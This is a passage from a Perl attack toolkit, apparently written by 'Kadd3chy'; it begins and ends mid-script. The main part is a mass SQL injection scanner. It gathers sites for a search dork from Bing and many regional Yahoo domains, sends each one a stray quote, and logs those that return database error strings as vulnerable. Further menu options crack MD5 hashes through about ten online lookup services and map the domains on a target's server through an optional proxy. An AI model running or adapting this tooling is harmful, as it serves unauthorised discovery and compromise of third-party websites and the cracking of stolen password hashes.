my @french = &Israel($dork);
print "\n[+] Israel    get ".scalar(@israel)." Sites";
my @french = &french($dork);
print "\n[+] french    get ".scalar(@french)." Sites";
my @Tunisia = &Tunisia($dork);
print "\n[+] Tunisia   get ".scalar(@Tunisia)." Sites";
print "\n---------------------------------------------------------";
print "\n[!] Searching vulnerable sites";
print "\n[!] Please wait...\n";
print "---------------------------------------------------------\n";
push(my @tot, @bing, @irlandia, @indonesia, @thailand, @argentina, @singapura, @malaysia, @vietnam, @swedia, @rusia, @czech, @belanda,
@australia, @brasil, @kanada, @jerman, @spanyol, @perancis, @italia, @inggris, @turki, @polandia, @filipina, @peru, @hongkong, @yunani,
@finlandia, @kolombia, @taiwan, @swiss, @mexico, @korea, @india, @irlandia,@Tunisia,@french,@israel,@Uk);
my @bersih=&clean(@tot);
my $akhir=scalar(@bersih);
foreach my $situs (@bersih) {
$ngitung++;
if ($ngitung==$akhir-1){
print "\n[!] Scan finish for $dork :D";
}
my $expl="http://".$situs."'";
my $mysql = "MySQL";
my $mssql = "MsSQL";
my $msacc = "MsAcces";
my $string = getcontent($expl);
if ( $string =~ m/You have an error in your SQL syntax/i || $string =~ m/Query failed/i || $string =~ m/SQL query failed/i ){
print "[*] MySQL vuln for SQLi on $situs\n";
printlog ("
Time     : $hour:$min:$sec
Site     : $situs
Database : $mysql\n");
}
elsif ( $string =~ m/ODBC SQL Server Driver/i || $string =~ m/Unclosed quotation mark/i || $string =~ m/Microsoft OLE DB Provider for/i ){
print "[*] MsSQL vuln for SQLi on $vuln\n";
printlog ("
Time     : $hour:$min:$sec
Site     : $situs
Database : $mssql\n");
}
elsif ( $string =~ m/Microsoft JET Database/i || $string =~ m/ODBC Microsoft Access Driver/i ){
print "[*] MsAcces vuln for SQLi on $vuln\n";
printlog ("
Time     : $hour:$min:$sec
Site     : $situs
Database : $msacc\n");
}
}
exit;
#Search Engine
sub bing() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=200; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&first=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {
                        my $link = $1;
            if ($link !~ /google/) {
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub indonesia() {
    my @list;
  my $key = $_[0];
  my $b   = 0;
    for (my $i=1; $i<=200; $i+=100) {
        my $search = ("http://id.search.yahoo.com/search?n=100&p=".uri_escape($key)."&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\//g) {
            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    } return @list;
}

sub india() {
    my @list;
  my $key = $_[0];
  my $b   = 0;
    for (my $i=1; $i<=200; $i+=100) {
        my $search = ("http://in.search.yahoo.com/search?n=100&p=".uri_escape($key)."&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\//g) {
            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    } return @list;
}

sub irlandia() {
    my @list;
  my $key = $_[0];
  my $b   = 0;
    for (my $i=1; $i<=200; $i+=100) {
        my $search = ("http://ie.search.yahoo.com/search?n=100&p=".uri_escape($key)."&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\//g) {
            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    } return @list;
}

sub korea() {
    my @list;
  my $key = $_[0];
  my $b   = 0;
    for (my $i=1; $i<=200; $i+=100) {
        my $search = ("http://kr.search.yahoo.com/search?n=100&p=".uri_escape($key)."&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\//g) {
            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    } return @list;
}

sub thailand() {
    my @list;
  my $key = $_[0];
  my $b   = 0;
    for (my $i=1; $i<=200; $i+=100) {
        my $search = ("http://th.search.yahoo.com/search?n=100&p=".uri_escape($key)."&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\//g) {
            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    } return @list;
}

sub argentina() {
    my @list;
  my $key = $_[0];
  my $b   = 0;
    for (my $i=1; $i<=200; $i+=100) {
        my $search = ("http://ar.search.yahoo.com/search?n=100&p=".uri_escape($key)."&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\//g) {
            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    } return @list;
}

sub singapura() {
    my @list;
  my $key = $_[0];
  my $b   = 0;
    for (my $i=1; $i<=200; $i+=100) {
        my $search = ("http://sg.search.yahoo.com/search?n=100&p=".uri_escape($key)."&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\//g) {
            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    } return @list;
}

sub malaysia() {
    my @list;
  my $key = $_[0];
  my $b   = 0;
    for (my $i=1; $i<=200; $i+=100) {
        my $search = ("http://malaysia.search.yahoo.com/search?n=100&p=".uri_escape($key)."&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\//g) {
            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    } return @list;
}

sub vietnam() {
    my @list;
  my $key = $_[0];
  my $b   = 0;
    for (my $i=1; $i<=200; $i+=100) {
        my $search = ("http://vn.search.yahoo.com/search?n=100&p=".uri_escape($key)."&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\//g) {
            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    } return @list;
}

sub swedia() {
    my @list;
  my $key = $_[0];
  my $b   = 0;
    for (my $i=1; $i<=200; $i+=100) {
        my $search = ("http://se.search.yahoo.com/search?n=100&p=".uri_escape($key)."&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\//g) {
            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    } return @list;
}

sub russia() {
    my @list;
  my $key = $_[0];
  my $b   = 0;
    for (my $i=1; $i<=200; $i+=100) {
        my $search = ("http://ru.search.yahoo.com/search?n=100&p=".uri_escape($key)."&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\//g) {
            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    } return @list;
}

sub czech() {
    my @list;
  my $key = $_[0];
  my $b   = 0;
    for (my $i=1; $i<=200; $i+=100) {
        my $search = ("http://cs.search.yahoo.com/search?n=100&p=".uri_escape($key)."&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\//g) {
            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    } return @list;
}

sub belanda() {
    my @list;
  my $key = $_[0];
  my $b   = 0;
    for (my $i=1; $i<=200; $i+=100) {
        my $search = ("http://nl.search.yahoo.com/search?n=100&p=".uri_escape($key)."&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\//g) {
            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    } return @list;
}

sub australia() {
    my @list;
  my $key = $_[0];
  my $b   = 0;
    for (my $i=1; $i<=200; $i+=100) {
        my $search = ("http://au.search.yahoo.com/search?n=100&p=".uri_escape($key)."&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\//g) {
            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    } return @list;
}

sub brasil() {
    my @list;
  my $key = $_[0];
  my $b   = 0;
    for (my $i=1; $i<=200; $i+=100) {
        my $search = ("http://br.search.yahoo.com/search?n=100&p=".uri_escape($key)."&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\//g) {
            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    } return @list;
}

sub canada() {
    my @list;
  my $key = $_[0];
  my $b   = 0;
    for (my $i=1; $i<=200; $i+=100) {
        my $search = ("http://ca.search.yahoo.com/search?n=100&p=".uri_escape($key)."&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\//g) {
            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    } return @list;
}

sub jerman() {
    my @list;
  my $key = $_[0];
  my $b   = 0;
    for (my $i=1; $i<=200; $i+=100) {
        my $search = ("http://de.search.yahoo.com/search?n=100&p=".uri_escape($key)."&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\//g) {
            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    } return @list;
}

sub spanyol() {
    my @list;
  my $key = $_[0];
  my $b   = 0;
    for (my $i=1; $i<=200; $i+=100) {
        my $search = ("http://es.search.yahoo.com/search?n=100&p=".uri_escape($key)."&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\//g) {
            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    } return @list;
}

sub perancis() {
    my @list;
  my $key = $_[0];
  my $b   = 0;
    for (my $i=1; $i<=200; $i+=100) {
        my $search = ("http://fr.search.yahoo.com/search?n=100&p=".uri_escape($key)."&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\//g) {
            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    }
return @list;
}

sub italia() {
    my @list;
  my $key = $_[0];
  my $b   = 0;
    for (my $i=1; $i<=200; $i+=100) {
        my $search = ("http://it.search.yahoo.com/search?n=100&p=".uri_escape($key)."&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\//g) {
            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    } return @list;
}

sub turki() {
    my @list;
  my $key = $_[0];
  my $b   = 0;
    for (my $i=1; $i<=200; $i+=100) {
        my $search = ("http://tr.search.yahoo.com/search?n=100&p=".uri_escape($key)."&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\//g) {
            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    } return @list;
}

sub polandia() {
    my @list;
  my $key = $_[0];
  my $b   = 0;
    for (my $i=1; $i<=200; $i+=100) {
        my $search = ("http://pl.search.yahoo.com/search?n=100&p=".uri_escape($key)."&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\//g) {
            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    } return @list;
}

sub filipina() {
    my @list;
  my $key = $_[0];
  my $b   = 0;
    for (my $i=1; $i<=200; $i+=100) {
        my $search = ("http://ph.search.yahoo.com/search?n=100&p=".uri_escape($key)."&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\//g) {
            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    } return @list;
}

sub inggris() {
    my @list;
  my $key = $_[0];
  my $b   = 0;
    for (my $i=1; $i<=200; $i+=100) {
        my $search = ("http://uk.search.yahoo.com/search?n=100&p=".uri_escape($key)."&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\//g) {
            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    } return @list;
}

sub peru() {
    my @list;
  my $key = $_[0];
  my $b   = 0;
    for (my $i=1; $i<=200; $i+=100) {
        my $search = ("http://pe.search.yahoo.com/search?n=100&p=".uri_escape($key)."&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\//g) {
            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    } return @list;
}

sub hongkong() {
    my @list;
  my $key = $_[0];
  my $b   = 0;
    for (my $i=1; $i<=200; $i+=100) {
        my $search = ("http://hk.search.yahoo.com/search?n=100&p=".uri_escape($key)."&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\//g) {
            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    } return @list;
}

sub yunani() {
    my @list;
  my $key = $_[0];
  my $b   = 0;
    for (my $i=1; $i<=200; $i+=100) {
        my $search = ("http://gr.search.yahoo.com/search?n=100&p=".uri_escape($key)."&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\//g) {
            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    } return @list;
}

sub finlandia() {
    my @list;
  my $key = $_[0];
  my $b   = 0;
    for (my $i=1; $i<=200; $i+=100) {
        my $search = ("http://fi.search.yahoo.com/search?n=100&p=".uri_escape($key)."&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\//g) {
            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    } return @list;
}

sub kolombia() {
    my @list;
  my $key = $_[0];
  my $b   = 0;
    for (my $i=1; $i<=200; $i+=100) {
        my $search = ("http://co.search.yahoo.com/search?n=100&p=".uri_escape($key)."&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\//g) {
            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    } return @list;
}

sub taiwan() {
    my @list;
  my $key = $_[0];
  my $b   = 0;
    for (my $i=1; $i<=200; $i+=100) {
        my $search = ("http://tw.search.yahoo.com/search?n=100&p=".uri_escape($key)."&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\//g) {
            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    } return @list;
}

sub swiss() {
    my @list;
  my $key = $_[0];
  my $b   = 0;
    for (my $i=1; $i<=200; $i+=100) {
        my $search = ("http://ch.search.yahoo.com/search?n=100&p=".uri_escape($key)."&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\//g) {
            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    } return @list;
}

sub mexico() {
    my @list;
        my $key = $_[0];
        my $b     = 0;
    for (my $i=1; $i<=200; $i+=100) {
        my $search = ("http://mx.search.yahoo.com/search?n=100&p=".uri_escape($key)."&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\//g) {
            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    } return @list;
}
sub Uk() {
    my @list;
  my $key = $_[0];
  my $b   = 0;
    for (my $i=1; $i<=200; $i+=100) {
        my $search = ("http://co.uk.search.yahoo.com/search?n=100&p=".uri_escape($key)."&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\//g) {
            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    } return @list;
}
sub Israel() {
    my @list;
  my $key = $_[0];
  my $b   = 0;
    for (my $i=1; $i<=200; $i+=100) {
        my $search = ("http://co.il.search.yahoo.com/search?n=100&p=".uri_escape($key)."&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\//g) {
            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    } return @list;
}
sub french() {
    my @list;
  my $key = $_[0];
  my $b   = 0;
    for (my $i=1; $i<=200; $i+=100) {
        my $search = ("http://fr.search.yahoo.com/search?n=100&p=".uri_escape($key)."&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\//g) {
            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    } return @list;
}
sub Tunisia() {
    my @list;
  my $key = $_[0];
  my $b   = 0;
    for (my $i=1; $i<=200; $i+=100) {
        my $search = ("http://tn.search.yahoo.com/search?n=100&p=".uri_escape($key)."&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\//g) {
            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    } return @list;
}
################################################
sub search_engine_query() {
        my $url = $_[0];
        $url =~ s/http:\/\///;
        my $host = $url;
        my $query = $url;
        my $page  = "";
        $host =~ s/href=\"?http:\/\///;
        $host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
        $query =~ s/$host//;
        if ($query eq "") { $query = "/"; }
                eval {
                        my $sock = IO::Socket::INET->new(PeerAddr=>"$host", PeerPort=>"80", Proto=>"tcp") or return;
                        my $sget = "GET $query HTTP/1.0\r\n";
                        $sget .= "Host: $host\r\n";
                        $sget .= "Accept: */*\r\n";
                        $sget .= "User-Agent: $uagent\r\n";
                        $sget .= "Connetion: Close\r\n\r\n";
                        print $sock $sget;
                        my @pages = <$sock>;
                        $page = "@pages";
                        close($sock);
                };
        return $page;
}

sub clean() {
    my @cln = ();
    my %visit = ();
    foreach my $element (@_) {
        $element =~ s/\/+/\//g;
        next if $visit{$element}++;
        push @cln, $element;
    }
    return @cln;
}

sub links() {
my @l;
my $link=$_[0];
my $host=$_[0];
my $hdir=$_[0];
$hdir=~s/(.*)\/[^\/]*$/\1/;
$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
$host.="/";
$link.="/";
$hdir.="/";
$host=~s/\/\//\//g;
$hdir=~s/\/\//\//g;
$link=~s/\/\//\//g;
push(@l,$link,$host,$hdir);
return @l;
}

sub getcontent() {
    my $url = $_[0];
    my $req = HTTP::Request->new(GET => $url);
    my $ua  = LWP::UserAgent->new();
    $ua->timeout(15);
    my $response = $ua->request($req);
    return $response->content;
}

sub printlog {
my ($logsec,$logmin,$loghour,$logmday,$logmon,$logyear,$logwday,$logyday,$logisdst)=localtime(time);
my $logtimestamp = sprintf("%4d-%02d-%02d,%02d:%02d:%02d",$logyear+1900,$logmon+1,$logmday,$loghour,$logmin,$logsec);
$logmon++;
$logyear=$logyear+1900;
my $log="[$logdir$logyear-$logmon-$logmday]SQLscan.log";
open(lo,">>$log") or die "$log:$!";
print lo @_[0];
close(lo);
return;
}
}
if($targett eq '4')
{
system('cls');
system('title Md5 Cracker Online');
                    {
use LWP::UserAgent;
use HTTP::Request::Common;

system('cls');
system('title Online Md5 Cracker Edited By Moat3z_Kadd3chy');
print "\n\t***********************************\n";
print "\t*           MD5 Cracker             *\n";
print "\t*         Coded By Kadd3chy         *\n";
print "\t***********************************\n";


print "\nSubmit The Menu ~# ";
$pick=<STDIN>;
chop($pick);

if($pick == "1"){
MD5FAIL:
print "\nEnter The hash of MD5 ~# ";
$hash=<STDIN>;
chop($hash);


if (length($hash)==32)
{
print "\n\t\n";
print "\t*Md5 Cracker Online\n";
print "\t*Coded By Kadd3chy\n";
print "\t*Greetz To All My Friends \n";
print  "\t\n\n";
&next;
} else {
print "\nNot MD5! \n\nLook The Menu again!\n\n";
goto MD5FAIL;
}
}


if($pick == "2"){

print "\nPlease Submit The Hash Location ~# ";
$file=<STDIN>;
chop($file);

open(RES,"<","$file");
@lol = <RES>;
close(RES);

foreach $hash(@lol){
print "       \nEnter The Md5 hahs Link:  $hash\n\n";
&next;
}
$url = substr($url, $1 + 13);
open (txt,">>md5.txt");
print txt  $1,"\n";
close(txt);
}
sub next {

$url = "http://www.md5decryption.com/";
$lwp = LWP::UserAgent->new();
$lwp -> agent("Mozilla/5.0 (X11; U; Linux i686 (x86_64); de; rv:1.9.1.8) Gecko/20100202 Firefox/3.5.8");
$request = $lwp->post($url, ["hash" => $hash, "submit" => "Decrypt It!"]);

print "1 www.md5decryption.com          ----  ";
if ($request->content =~ /Decrypted Text: <\/b>(.*)<\/font><br\/><center>/)
{
print "Result : $1\n";
} else {
print "Result : Hash not found!\n";
}
$url = "http://tools.kerinci.net/?x=md5";
$lwp = LWP::UserAgent->new();
$lwp->agent("Mozilla/5.0 (X11; U; Linux i686 (x86_64); de; rv:1.9.1.8) Gecko/20100202 Firefox/3.5.8");
$request = $lwp->post($url, ["hash" => $hash, "search" => "Search"]);

print "2 www.kerinci.net                ----  ";
if ($request -> content =~ /not\ found<\/a><\/td><\/tr>/){
print "Result : Hash not found!\n";
} else {
$request -> content =~ /<tr><td>result:<\/td><td>(.+)<\/td><\/tr>/;
print "Result : $1\n";
}
$url = "http://md5.rednoize.com/?q=$hash&s=md5&go.x=21&go.y=18&go=Search";
$lwp = LWP::UserAgent->new();
$lwp->agent("Mozilla/5.0 (X11; U; Linux i686 (x86_64); de; rv:1.9.1.8) Gecko/20100202 Firefox/3.5.8");
$connect = $lwp -> get($url);

print "3 www.md5.rednoize.com           ----  ";
if ($connect->content =~ /<div id="result" >(.*)<\/div>/)
{
print "Result : $1\n";
} else {
print "Result : Hash not found!\n";
}
$url = "http://www.md5online.org/md5-decrypt.html";
$lwp = LWP::UserAgent->new();
$lwp->agent("Mozilla/5.0 (X11; U; Linux i686 (x86_64); de; rv:1.9.1.8) Gecko/20100202 Firefox/3.5.8");
$request = $lwp->post($url, ["hash" => $hash, "submit" => "Decrypt"]);

print "4 www.md5online.org              ----  ";
if ($request -> content =~ /not\ found<\/a><\/td><\/tr>/){
print "Result : Hash not found!\n";
} else {
$request -> content =~ /<tr><td>result:<\/td><td>(.+)<\/td><\/tr>/;
print "Result : $1\n";
}
$url = "http://www.hashkiller.co.uk/md5-decrypter.aspx";
$lwp = LWP::UserAgent->new();
$lwp->agent("Mozilla/5.0 (X11; U; Linux i686 (x86_64); de; rv:1.9.1.8) Gecko/20100202 Firefox/3.5.8");
$request = $lwp->post($url, ["hash" => $hash, "submit" => "Submit"]);

print "5 hashkiller.co.uk               ----  ";
if ($request -> content =~ /not\ found<\/a><\/td><\/tr>/){
print "Result : Hash not found!\n";
} else {
$request -> content =~ /<tr><td>result:<\/td><td>(.+)<\/td><\/tr>/;
print "Result : $1\n";
}
$url = "https://crackstation.net";
$lwp = LWP::UserAgent->new();
$lwp->agent("Mozilla/5.0 (X11; U; Linux i686 (x86_64); de; rv:1.9.1.8) Gecko/20100202 Firefox/3.5.8");
$request = $lwp->post($url, ["hash" => $hash, "submit" => "Crack Hashes"]);

print "6 crackstation.net               ----  ";
if ($request -> content =~ /not\ found<\/a><\/td><\/tr>/){
print "Result : Hash not found!\n";
} else {
$request -> content =~ /<tr><td>result:<\/td><td>(.+)<\/td><\/tr>/;
print "Result : $1\n";
}
$url = "crackhash.com";
$lwp = LWP::UserAgent->new();
$lwp->agent("Mozilla/5.0 (X11; U; Linux i686 (x86_64); de; rv:1.9.1.8) Gecko/20100202 Firefox/3.5.8");
$request = $lwp->post($url, ["hash" => $hash, "submit" => "Start Cracking"]);

print "7 crackhash.com                  ----  ";
if ($request -> content =~ /not\ found<\/a><\/td><\/tr>/){
print "Result : Hash not found!\n";
} else {
$request -> content =~ /<tr><td>result:<\/td><td>(.+)<\/td><\/tr>/;
print "Result : $1\n";
}
$url = "www.md5.net/md5-cracker/";
$lwp = LWP::UserAgent->new();
$lwp->agent("Mozilla/5.0 (X11; U; Linux i686 (x86_64); de; rv:1.9.1.8) Gecko/20100202 Firefox/3.5.8");
$request = $lwp->post($url, ["hash" => $hash, "text" => "submit"]);

print "8 www.md5.net                    ----  ";
if ($request -> content =~ /not\ found<\/a><\/td><\/tr>/){
print "Result : Hash not found!\n";
} else {
$request -> content =~ /<tr><td>result:<\/td><td>(.+)<\/td><\/tr>/;
print "Result : $1\n";
}
$url = "http://www.md5this.com/";
$lwp = LWP::UserAgent->new();
$lwp->agent("Mozilla/5.0 (X11; U; Linux i686 (x86_64); de; rv:1.9.1.8) Gecko/20100202 Firefox/3.5.8");
$request = $lwp->post($url, ["hash" => $hash, "option" => "com_search"]);

print "9 www.md5this.com                ----  ";
if ($request -> content =~ /not\ found<\/a><\/td><\/tr>/){
print "Result : Hash not found!\n";
} else {
$request -> content =~ /<tr><td>result:<\/td><td>(.+)<\/td><\/tr>/;
print "Result : $1\n";
}
$url = "http://www.hash-cracker.com/";
$lwp = LWP::UserAgent->new();
$lwp->agent("Mozilla/5.0 (X11; U; Linux i686 (x86_64); de; rv:1.9.1.8) Gecko/20100202 Firefox/3.5.8");
$request = $lwp->post($url, ["hash" => $hash, "submit" => "Crack!!"]);

print "10 www.hash-cracker.com          ----  ";
if ($request -> content =~ /not\ found<\/a><\/td><\/tr>/){
print "Result : Hash not found!\n";
} else {
$request -> content =~ /<tr><td>result:<\/td><td>(.+)<\/td><\/tr>/;
print "Result : $1\n";
}
$url = substr($url, $1 + 13);
open (txt,">>MD5.txt");
print txt  $1,"\n";
close(txt);
}}
}
if($targett eq '5')
{
system('cls');
system('title Reverse IP');
print  "\t>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>\n";
print "\t>                          Reverse IP Lookup                         >\n";
print "\t>                           C0ded By Kadd3chy                        >\n";
print "\t>                            Result In Log.txt                       >\n";
print  "\t>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>\n";
print "\n";

use HTTP::Request;
use LWP::UserAgent;
if($^O =~ /Win/){

print "\n[*]Use Proxy ? (y/n):";
my $chose = <>;
chomp($chose);

if(lc($chose) eq 'y') {
sleep (3);
print "\n\n [+]Put Proxy (ex: 127.0.0.1:80) :";
my $proxy = <>;
chomp($proxy);
print "\n\n[*]Put Host or IP (host without http://) :";
my $host = <>;
chomp($host);
my $file = "log.txt";
$ua = LWP::UserAgent->new;
$ua->agent("Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.1) Gecko/20090624 Firefox/3.5");
$ua->proxy('http', 'http://'.$proxy.'');
my $zz = $ua->post('http://domains.yougetsignal.com/domains.php',
{
        remoteAddress => $host,
}
);

my $resulta = $zz->content;
while ($resulta =~ m/\[([^\]]*)\]/g)
{
        $zeb = $1;
        $zeb =~ m/\"(.*?)\", \"?\"/g;
open(a, ">>log.txt");
print a "http://$1/\n";
close(a);
}
if($resulta =~ /\"domainCount\":\"(.*?)\"/) {
sleep(2);
  print "\n  [*] Total website Recolted: $1\n";
}
if($resulta =~ /\"remoteIpAddress\":\"(.*?)\"/) {
sleep(1);

  print "\n  [*] IP serveur: $1\n";
}
print "\n[+] All website Reversed.\n";
}
if(lc($chose) eq 'n') {

print "\nPut Host or IP (host without http://) :";
my $host = <>;
chomp($host);
my $file = "log.txt";
my $ua = LWP::UserAgent->new(agent => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.1) Gecko/20090624 Firefox/3.5');
my $zz = $ua->post('http://domains.yougetsignal.com/domains.php',
{
        remoteAddress => $host,
}
);

my $resulta = $zz->content;
while ($resulta =~ m/\[([^\]]*)\]/g)
{
        $zeb = $1;
